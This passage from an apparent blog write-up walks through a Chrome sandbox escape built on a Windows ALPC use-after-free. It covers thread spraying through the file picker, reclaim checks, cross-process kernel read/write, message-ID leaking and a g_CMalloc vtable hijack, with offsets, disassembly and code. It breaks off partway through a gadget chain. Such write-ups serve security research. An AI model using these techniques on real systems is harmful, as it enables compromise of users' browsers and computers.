+&lt;p&gt;&lt;strong&gt;There is no sandbox at all.&lt;/strong&gt; And it&amp;#x2019;s Medium IL. In Step 4, OUYA77 showed us how Chrome locks itself down, but the file picker alone has to load shell extensions and COM, so it simply couldn&amp;#x2019;t be locked down&amp;#x2026;!! (ba dum tss)&lt;/p&gt;
+&lt;p&gt;And what util_win does is &lt;code&gt;CoCreateInstance(CLSID_FileOpenDialog)&lt;/code&gt;. The moment COM is initialized as an STA, combase and rpcrt4 spin up thread pools and RPC threads all at once. With a single picker call, &lt;code&gt;_ETHREAD&lt;/code&gt; objects get freshly allocated &amp;#x2014; 8~16 of them.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image9.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;That one line we mentioned back in 1.1 pays off right here. One &lt;code&gt;NtCreateThreadEx&lt;/code&gt; equals one &lt;code&gt;0xa80&lt;/code&gt;. With a single line of JS, we make somebody else&amp;#x2019;s Medium IL process allocate our size class in bulk!&lt;/p&gt;
+&lt;p&gt;That said, not just any thread will do. During the first few ms of the file picker being created, what gets made are the ntdll parallel loader&amp;#x2019;s worker threads, and these guys &lt;strong&gt;die the instant loading finishes.&lt;/strong&gt; And on their way out they free the slab we worked so hard to feed them. It&amp;#x2019;s like reclaiming it and then spitting it right back out.. &amp;#x1F92E;&lt;/p&gt;
+&lt;p&gt;The window we&amp;#x2019;re after is &lt;strong&gt;the COM initialization burst&lt;/strong&gt;. It arrives tens to hundreds of ms after the dialog request goes in. And the threads created here stay alive the whole time the dialog is open. Also, what we&amp;#x2019;re after isn&amp;#x2019;t &amp;#x201C;any allocation of size &lt;code&gt;0xa80&lt;/code&gt;&amp;#x201C; &amp;#x2014; it has to be &lt;strong&gt;a real thread&lt;/strong&gt;. The kernel believes that spot is an &lt;code&gt;_ETHREAD&lt;/code&gt; and reads a fixed offset. If some other object that merely matches in size sits there, the value inside is garbage &amp;#x2014; and the moment the kernel grabs that as a process, we&amp;#x2019;d hit another BSOD, right?&lt;/p&gt;
+&lt;p&gt;This is exactly why the file picker makes such a good spray primitive. &lt;strong&gt;It calls a real &lt;code&gt;CreateThread&lt;/code&gt; on our behalf!&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-3-prime-lookaside-SELF-CHECK-filtering&#34;&gt;&lt;a href=&#34;#2-3-prime-lookaside-SELF-CHECK-filtering&#34; class=&#34;headerlink&#34; title=&#34;2.3 prime_lookaside, SELF-CHECK filtering&#34;&gt;&lt;/a&gt;2.3 prime_lookaside, SELF-CHECK filtering&lt;/h2&gt;&lt;p&gt;One gate left, right? Keeping the bucket open!&lt;/p&gt;
+&lt;p&gt;But 1.2 already gave us the answer. &lt;code&gt;Depth&lt;/code&gt; only grows when misses happen, remember? So we generate misses on purpose. Repeatedly creating and destroying threads keeps triggering &lt;code&gt;0xa80&lt;/code&gt; allocations, and every alloc against an empty bucket piles on another miss. That is &lt;code&gt;prime_lookaside&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;That said, &lt;strong&gt;don&amp;#x2019;t make too many.&lt;/strong&gt; Remember the second reason from 2.1? The threads I create are competitors too. Run too many and I end up grabbing my own slab back. After a lot of trial and error, I settled on 8 as the optimal number.&lt;/p&gt;
+&lt;p&gt;The sequence goes like this.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;prime_lookaside(8) - open the bucket&lt;/li&gt;
+&lt;li&gt;showOpenFilePicker() - thread spray via util_win&lt;/li&gt;
+&lt;li&gt;WorkerThread exits - _ETHREAD free&lt;/li&gt;
+&lt;li&gt;short wait - leave room for somebody to move into the spot&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;but how do we know who that somebody is?&lt;/del&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;That last line is the problem. Reclaim happens quietly inside the kernel, and nobody tells you whether it succeeded. Move on to the next step without knowing, and you may pay for it later&amp;#x2026; In fact, on my first attempt I went &amp;#x201C;huh? reclaim seems to be working fine? isn&amp;#x2019;t this easy?&amp;#x201D; and lived to regret it..&amp;#x1F62D;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image10.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So I decided to verify it. As it happens, combase has exactly the right value for this: &lt;code&gt;g_CMalloc&lt;/code&gt; &amp;#x2014; the allocator object COM goes through every time it takes and releases memory, and its first 8 bytes are a &lt;code&gt;CRetailMalloc&lt;/code&gt; vtable pointer. If the reclaim worked, we should be able to read the memory of whichever process took that spot &amp;#x2014; so let&amp;#x2019;s just read &lt;code&gt;[g_CMalloc]&lt;/code&gt;. If a genuine &lt;code&gt;CRetailMalloc&lt;/code&gt; vtable address is sitting there &amp;#x2014; let&amp;#x2019;s call this &lt;code&gt;WANT&lt;/code&gt; &amp;#x2014; then it means a healthy process with combase loaded has taken that spot. The address really was sitting there, so naturally I believed the reclaim had gone well&amp;#x2026; for a very short while, anyway..&lt;/p&gt;
+&lt;p&gt;I attached kd and looked directly at my own renderer, and that&amp;#x2019;s where I found the problem.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image11.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;rendere&lt;span class=&#34;hljs-string&#34;&gt;r&amp;apos;s [g_CMalloc]  =  WANT&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;util_win&amp;apos;&lt;/span&gt;s [g_CMalloc]  =  WANT&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;They&amp;#x2019;re the same value. Which makes sense when you think about it &amp;#x2014; the same combase is loaded in the renderer too. So getting &lt;code&gt;WANT&lt;/code&gt; back didn&amp;#x2019;t mean &amp;#x201C;reclaim succeeded&amp;#x201D;; it only meant &lt;strong&gt;&amp;#x201C;the kernel read somewhere and brought back a value&amp;#x201D;&lt;/strong&gt; &amp;#x2014; and that somewhere could have been util_win, or just my own renderer.&lt;/p&gt;
+&lt;p&gt;If the reclaim is late and my own renderer takes the spot, the gate reads that as success and marches right on. And inside Untrusted IL, &lt;code&gt;WinExec&lt;/code&gt; is blocked, so cmd would never show up..?&lt;/p&gt;
+&lt;p&gt;So how on earth do we tell these two apart?? While mulling it over, this approach came to me. I embedded an 8-byte &lt;code&gt;CTRL_MAGIC&lt;/code&gt; into the CTRL structure the exploit DLL uses, and prepared one more entry that reads that address. This becomes a value that exists only in my renderer&amp;#x2019;s address space!!&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;my renderer took it &amp;#x2192; that address is mapped, and &lt;strong&gt;the magic comes right back&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;util_win took it &amp;#x2192; that address is unmapped on their side &amp;#x2192; &lt;strong&gt;the magic never comes back!!&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;So we make it two gates instead of one!!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs applescript&#34;&gt;[g_CMalloc] == WANT        a live combase process has taken &lt;span class=&#34;hljs-keyword&#34;&gt;the&lt;/span&gt; spot..!
+        AND
+[ctrl] != CTRL_MAGIC       &lt;span class=&#34;hljs-keyword&#34;&gt;but&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;it&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;isn&amp;apos;t&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;me&lt;/span&gt;??&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So we only proceed when both gates pass, and if the magic comes back we throw that process away and wait again hehe &amp;#x270C;&amp;#xFE0F;&lt;/p&gt;
+&lt;h1 id=&#34;3-Reading-Across-Processes&#34;&gt;&lt;a href=&#34;#3-Reading-Across-Processes&#34; class=&#34;headerlink&#34; title=&#34;3. Reading Across Processes&#34;&gt;&lt;/a&gt;3. Reading Across Processes&lt;/h1&gt;&lt;h2 id=&#34;3-1-LPCP-DATA-INFO-cross-process-R-W&#34;&gt;&lt;a href=&#34;#3-1-LPCP-DATA-INFO-cross-process-R-W&#34; class=&#34;headerlink&#34; title=&#34;3.1 LPCP_DATA_INFO - cross-process R/W&#34;&gt;&lt;/a&gt;3.1 LPCP_DATA_INFO - cross-process R/W&lt;/h2&gt;&lt;p&gt;Now that we can even confirm whether the reclaim happened, it&amp;#x2019;s finally time to actually read and write memory!!! But we get stuck again right here &lt;del&gt;(how many times are we going to get stuck!!)&lt;/del&gt;. I&amp;#x2019;m currently an Untrusted IL renderer. I can&amp;#x2019;t grab a util_win handle with &lt;code&gt;OpenProcess&lt;/code&gt;, and I can&amp;#x2019;t call &lt;code&gt;ReadProcessMemory&lt;/code&gt; either. &lt;strong&gt;There&amp;#x2019;s no way to touch somebody else&amp;#x2019;s address space directly.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;So instead of doing it ourselves, we make the kernel do it for us! This is where the vulnerability we covered back in Step 5 really shines!!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;NTSTATUS &lt;span class=&#34;hljs-title&#34;&gt;NtReadRequestData&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    HANDLE        PortHandle,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    PPORT_MESSAGE Message,         &lt;span class=&#34;hljs-comment&#34;&gt;// the kernel finds the message in the queue by the MessageId inside this&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    ULONG         DataEntryIndex,  &lt;span class=&#34;hljs-comment&#34;&gt;// which index into LPCP_DATA_INFO.Entries[]&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    PVOID         LocalBuffer,     &lt;span class=&#34;hljs-comment&#34;&gt;// our own buffer&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    SIZE_T        Length,&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;    PSIZE_T       ReturnLength&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-params&#34;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;NtWriteRequestData&lt;/code&gt; has exactly the same signature. Only the direction is reversed!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;NtReadRequestData    target &lt;span class=&#34;hljs-built_in&#34;&gt;process&lt;/span&gt;[Entries[i].BaseAddress]  &amp;#x2192;  our &lt;span class=&#34;hljs-built_in&#34;&gt;buffer&lt;/span&gt;
+NtWriteRequestData   our &lt;span class=&#34;hljs-built_in&#34;&gt;buffer&lt;/span&gt;  &amp;#x2192;  target &lt;span class=&#34;hljs-built_in&#34;&gt;process&lt;/span&gt;[Entries[i].BaseAddress]&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Which process the &amp;#x201C;target process&amp;#x201D; actually is isn&amp;#x2019;t something I decide &amp;#x2014; the kernel decides on its own. And how it decides is exactly the story I put off back in 2.1.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image12.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;LpcpCopyRequestData&lt;/code&gt; &amp;#x2014; traced step by step, this is what it does.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Find the message in the port queue using Message&amp;#x2019;s MessageId.&lt;/li&gt;
+&lt;li&gt;msg + 0x20  &amp;#x2192;  WaitingThread   &amp;#x2190; the _ETHREAD we freed&lt;/li&gt;
+&lt;li&gt;[WaitingThread + 0x220]  &amp;#x2192;  Process   &amp;#x2190; that thread&amp;#x2019;s owning process&lt;/li&gt;
+&lt;li&gt;Attach to that process and copy&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The &lt;code&gt;WaitingThread&lt;/code&gt; in step 2 is that dangling pointer we created back in Step 5, and the &lt;code&gt;+0x220&lt;/code&gt; in step 3 is the offset I meant back in 2.1 when I said &amp;#x201C;the kernel reads a fixed offset&amp;#x201D;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;nt!LpcpCopyRequestData+0x1aa:
+  mov  rax, qword ptr [rsp+48h]     ; the message we found
+  mov  r9,  qword ptr [rax+20h]     ; msg + 0x20  =  WaitingThread
+  test r9, r9
+  jne  ...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The second line is exactly where that dangling pointer gets pulled out. And what comes right after is a single &lt;code&gt;test r9, r9&lt;/code&gt;. &lt;strong&gt;It only checks for NULL &amp;#x2014; it never checks whether that&amp;#x2019;s actually a live thread.&lt;/strong&gt; This is precisely the crack we dig into.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs nasm&#34;&gt;nt!LpcpCopyRequestData+0x270:
+  mov  rcx, qword ptr [r8+0B8h]     ; our process
+  mov  r8,  qword ptr [r9+220h]     ; WaitingThread + 0x220  =  target process
+  mov  r9,  qword ptr [rsp+60h]     ; the entry&amp;apos;s BaseAddress
+  mov  rdx, qword ptr [rsp+0E0h]    ; our buffer
+
+nt!LpcpCopyRequestData+0x28d:
+  mov  r8,  qword ptr [r8+0B8h]     ; our process
+  mov  rcx, qword ptr [r9+220h]     ; target process
+  mov  r9,  qword ptr [rsp+0E0h]    ; our buffer
+  mov  rdx, qword ptr [rsp+60h]     ; the entry&amp;apos;s BaseAddress
+
+nt!LpcpCopyRequestData+0x2a8:
+  call nt!MiCopyVirtualMemory&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;You can see there are two blocks, right? And they&amp;#x2019;re perfectly symmetric. Unpacking them as &lt;code&gt;MiCopyVirtualMemory(From, FromAddr, To, ToAddr, &amp;#x2026;)&lt;/code&gt; gives us this.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x270&lt;/span&gt;    our &lt;span class=&#34;hljs-built_in&#34;&gt;buffer&lt;/span&gt;      &amp;#x2192;  target &lt;span class=&#34;hljs-built_in&#34;&gt;process&lt;/span&gt;   =  Write
++&lt;span class=&#34;hljs-number&#34;&gt;0x28d&lt;/span&gt;    target &lt;span class=&#34;hljs-built_in&#34;&gt;process&lt;/span&gt;  &amp;#x2192;  our &lt;span class=&#34;hljs-built_in&#34;&gt;buffer&lt;/span&gt;       =  Read&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And what splits these two is a single byte, &lt;code&gt;cl&lt;/code&gt;, taken at the very top of the function. Read or write, &lt;strong&gt;they both end up entering the same function, and only one flag decides the direction&lt;/strong&gt;!&lt;/p&gt;
+&lt;p&gt;Originally this slot pointed at the thread that sent the message &amp;#x2014; that is, the renderer. The moment we kill that thread and util_win reclaims the spot, that very same pointer points at &lt;strong&gt;a live thread inside util_win&lt;/strong&gt;. The kernel doesn&amp;#x2019;t think anything is off. It just attaches to util_win as told and copies away!! &amp;#x1F929;&lt;/p&gt;
+&lt;p&gt;That said, two constraints come attached.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Writes only work on writable pages&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The kernel validates addresses against UserMode. Reading works on &lt;code&gt;.text&lt;/code&gt; or &lt;code&gt;.rdata&lt;/code&gt; alike, but writing requires a page that is writable at runtime. This becomes the decisive constraint when we pick &amp;#x201C;what to overwrite&amp;#x201D; in Chapter 4.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;The addresses to read and write must be decided up front&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The entry&amp;#x2019;s &lt;code&gt;BaseAddress&lt;/code&gt; gets copied to the kernel&amp;#x2019;s own side at the moment the message is sent. Changing the value in our buffer afterwards does nothing. So &amp;#x201C;let&amp;#x2019;s reclaim first and decide the addresses later&amp;#x201D; simply isn&amp;#x2019;t an option. &lt;strong&gt;Everything about where we&amp;#x2019;ll read and write has to be decided before we pull the trigger..!!&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-2-Message-ID-leak&#34;&gt;&lt;a href=&#34;#3-2-Message-ID-leak&#34; class=&#34;headerlink&#34; title=&#34;3.2 Message ID leak&#34;&gt;&lt;/a&gt;3.2 Message ID leak&lt;/h2&gt;&lt;p&gt;3.1 built all the tools. But to call &lt;code&gt;NtReadRequestData&lt;/code&gt;, we needed one more argument. That would be &lt;code&gt;PPORT_MESSAGE Message&lt;/code&gt;!&lt;/p&gt;
+&lt;p&gt;The kernel doesn&amp;#x2019;t use that buffer as data. &lt;strong&gt;It uses the &lt;code&gt;MessageId&lt;/code&gt; inside it to find the message in the port queue.&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs vbnet&#34;&gt;we don&lt;span class=&#34;hljs-comment&#34;&gt;&amp;apos;t know the Message ID  &amp;#x2192;  the kernel can&amp;apos;t find the message  &amp;#x2192;  the call itself fails&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;In effect, no matter how well the reclaim goes, if we can&amp;#x2019;t point at that message we can&amp;#x2019;t do anything. The problem is that we don&amp;#x2019;t get to choose the MID &amp;#x2014; it&amp;#x2019;s a handle the kernel issues itself when it puts the message on the queue. Not a counter that climbs in order, but a value whose upper bits select a table and whose remainder is an index, so there is no guessing it. And the thread that sent that message? We killed it with our own hands to create the UAF.&lt;/p&gt;
+&lt;p&gt;So for a while I thought this was impossible&amp;#x2026; Digging into the kernel&amp;#x2019;s lookup path, it splits that handle apart, pulls the message out of a global table, and the &lt;code&gt;MessageId&lt;/code&gt; on the message it pulled has to match the value we handed in exactly. &amp;#x1F50D;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image13.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;But I was mistaken. There was no need to invent a MID at all..? If you call &lt;code&gt;NtAlpcSendWaitReceivePort&lt;/code&gt; on the same port in &lt;strong&gt;receive-only, no-send&lt;/strong&gt; mode, the kernel hands the message sitting on the queue right back into our buffer. And the &lt;code&gt;MessageId&lt;/code&gt; the kernel assigned will be sitting right there, won&amp;#x2019;t it?&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;BYTE* recvBuf = VirtualAlloc(&lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;0x1000&lt;/span&gt;, ...);
+ULONG recvLen = &lt;span class=&#34;hljs-number&#34;&gt;0x200&lt;/span&gt;;
+LARGE_INTEGER timeout; timeout.QuadPart = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+
+NtAlpcSendWaitReceivePort(hPort, &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;,
+                          recvBuf, &amp;amp;recvLen, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &amp;amp;timeout);
+
+ULONG mid = *(ULONG*)(recvBuf + &lt;span class=&#34;hljs-number&#34;&gt;0x18&lt;/span&gt;);   &lt;span class=&#34;hljs-comment&#34;&gt;// &amp;#x2190; right here&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Printing it for real gives us this.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;st_recv&lt;/span&gt;       = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; (SUCCESS)
+&lt;span class=&#34;hljs-attribute&#34;&gt;recvLen&lt;/span&gt;       = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;recvBuf&lt;/span&gt;[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;b&lt;span class=&#34;hljs-number&#34;&gt;18&lt;/span&gt;      &amp;#x2190; MID leak!&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;No need to break the condition &amp;#x2014; &lt;strong&gt;we simply received a number that already satisfies it.&lt;/strong&gt; After all, it&amp;#x2019;s a value the kernel issued itself!&lt;/p&gt;
+&lt;p&gt;And we can hand this &lt;code&gt;recvBuf&lt;/code&gt; straight to &lt;code&gt;NtReadRequestData&lt;/code&gt; / &lt;code&gt;NtWriteRequestData&lt;/code&gt; as the &lt;code&gt;Message&lt;/code&gt; argument. The kernel reads the MID inside it on its own. In this state both reads and writes come back SUCCESS, and whatever we write reads back exactly as written. &lt;strong&gt;We can finally read and write the memory of a Medium process!!&lt;/strong&gt; &amp;#x1F389;&lt;/p&gt;
+&lt;p&gt;But one thing here &amp;#x2014; how did we know the addresses to read and write in the first place? Normally a chain like this starts with a base leak, right?&lt;/p&gt;
+&lt;p&gt;The hint came from the very place we got stuck earlier: &lt;code&gt;ntdll&lt;/code&gt; &amp;#xB7; &lt;code&gt;combase&lt;/code&gt; &amp;#xB7; &lt;code&gt;kernel32&lt;/code&gt; are all KnownDLLs, so within a single boot they load at the same address even in different processes. &lt;code&gt;chrome.dll&lt;/code&gt; is the same image too, so it&amp;#x2019;s no different. Which means that if we call &lt;code&gt;GetModuleHandleA&lt;/code&gt; once in our renderer, &lt;strong&gt;that value holds in util_win too, exactly as-is!!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;We do exactly the same thing in the later exploitation steps. Even the fake vtable we&amp;#x2019;ll build later is a copy of the real &lt;code&gt;CRetailMalloc&lt;/code&gt; vtable, &lt;strong&gt;read straight out of our own renderer&amp;#x2019;s combase&lt;/strong&gt;!!&lt;/p&gt;
+&lt;h1 id=&#34;4-Hijacking-Execution&#34;&gt;&lt;a href=&#34;#4-Hijacking-Execution&#34; class=&#34;headerlink&#34; title=&#34;4. Hijacking Execution&#34;&gt;&lt;/a&gt;4. Hijacking Execution&lt;/h1&gt;&lt;h2 id=&#34;4-1-vtable-pointer-overwrite&#34;&gt;&lt;a href=&#34;#4-1-vtable-pointer-overwrite&#34; class=&#34;headerlink&#34; title=&#34;4.1 vtable pointer overwrite&#34;&gt;&lt;/a&gt;4.1 vtable pointer overwrite&lt;/h2&gt;&lt;p&gt;Now that we can read and write, it&amp;#x2019;s time to overwrite. But there was one problem left over from 3.1, remember? &lt;strong&gt;Writes only work on writable pages!&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;KCT (Kernel Callback &lt;span class=&#34;hljs-keyword&#34;&gt;Table&lt;/span&gt;)   &amp;#x2192;  .rdata    &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt;-&lt;span class=&#34;hljs-keyword&#34;&gt;only&lt;/span&gt;
+__guard_check_icall_fptr      &amp;#x2192;  .mrdata   &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt;-&lt;span class=&#34;hljs-keyword&#34;&gt;only&lt;/span&gt;
+__guard_dispatch_icall_fptr   &amp;#x2192;  &lt;span class=&#34;hljs-number&#34;&gt;.00&lt;/span&gt;cfg    &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt;-&lt;span class=&#34;hljs-keyword&#34;&gt;only&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Reversing it myself, the only thing we can touch is &lt;code&gt;.data&lt;/code&gt;, which is writable at runtime. So I had to flip the question around. Not &amp;#x201C;what would be nice to overwrite&amp;#x201D;, but &lt;strong&gt;&amp;#x201C;is there anything that lives in .data and holds the execution flow?&amp;#x201D;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;The answer had been in our hands all along. That same &lt;code&gt;g_CMalloc&lt;/code&gt; we read back in 2.3 to confirm the reclaim!! And here&amp;#x2019;s the important part: &lt;strong&gt;what we need to overwrite is not the vtable.&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;CRetailMallocVtbl&lt;/span&gt;   combase + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;28&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;   &amp;#x2192;  .rdata   not one byte writable
+&lt;span class=&#34;hljs-attribute&#34;&gt;g_CMalloc&lt;/span&gt;           combase + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;338348&lt;/span&gt;   &amp;#x2192;  .data    writable&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The table itself, that row of function pointers, is read-only &amp;#x2014; we can&amp;#x2019;t lay a finger on it. But the object instance pointing at that table lives in &lt;code&gt;.data&lt;/code&gt;. So instead of fixing the table, we &lt;strong&gt;make the object look at a different table&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image14.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So, in a free spot inside ntdll&amp;#x2019;s &lt;code&gt;.data&lt;/code&gt;, we&amp;#x2019;ll build one fake vtable &lt;code&gt;S&lt;/code&gt;, and change the first 8 bytes of &lt;code&gt;g_CMalloc&lt;/code&gt; so that they point at it. &lt;code&gt;S&lt;/code&gt; is built by &lt;strong&gt;copying the real vtable wholesale&lt;/strong&gt;. As I mentioned in 3.2, combase is a KnownDLL, so we can simply read the &lt;code&gt;CRetailMallocVtbl&lt;/code&gt; that&amp;#x2019;s loaded in my own renderer. After that we only swap out the slots we need!&lt;/p&gt;
+&lt;p&gt;It&amp;#x2019;s important to leave slots 0~2 (&lt;code&gt;QueryInterface&lt;/code&gt; / &lt;code&gt;AddRef&lt;/code&gt; / &lt;code&gt;Release&lt;/code&gt;) real. COM keeps calling them in between allocations, and if they jump somewhere wrong the process just dies. &amp;#x1F480;&lt;/p&gt;
+&lt;p&gt;Finally, there&amp;#x2019;s one more reason &lt;code&gt;g_CMalloc&lt;/code&gt; is such a good target: I don&amp;#x2019;t have to build a trigger myself. Just overwrite it and util_win steps on it all by itself. As the file dialog initializes, COM takes and releases memory dozens of times. All we have to do is arm it and wait! &amp;#x1F60E;&lt;/p&gt;
+&lt;p&gt;And we don&amp;#x2019;t even have to wait on one particular slot. The very first allocation after entry is enough to fire the trigger!&lt;/p&gt;
+&lt;h2 id=&#34;4-2-Gadget-Chaining&#34;&gt;&lt;a href=&#34;#4-2-Gadget-Chaining&#34; class=&#34;headerlink&#34; title=&#34;4.2 Gadget Chaining&#34;&gt;&lt;/a&gt;4.2 Gadget Chaining&lt;/h2&gt;&lt;p&gt;&lt;code&gt;g_CMalloc&lt;/code&gt; now looks at &lt;code&gt;S&lt;/code&gt;, so the moment util_win next takes memory, &lt;code&gt;S[3]&lt;/code&gt; gets called. So what do we put in there to reach code execution? We can&amp;#x2019;t simply drop &lt;code&gt;WinExec&lt;/code&gt; in. At that moment &lt;code&gt;rcx&lt;/code&gt; is &lt;code&gt;&amp;amp;g_CMalloc&lt;/code&gt;. It&amp;#x2019;s a C++ method call, so the first argument is always &lt;code&gt;this&lt;/code&gt;. But the first argument of &lt;code&gt;WinExec(lpCmdLine, uCmdShow)&lt;/code&gt; has to be a string&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image15.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So &lt;strong&gt;&lt;code&gt;rcx&lt;/code&gt; needs stepping stones to get swapped out&lt;/strong&gt;. The first gadget calls the next one, and the second gadget is where &lt;code&gt;rcx&lt;/code&gt; gets swapped:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs x86asm&#34;&gt;G1              ntdll  + &lt;span class=&#34;hljs-number&#34;&gt;0xa36f0&lt;/span&gt;
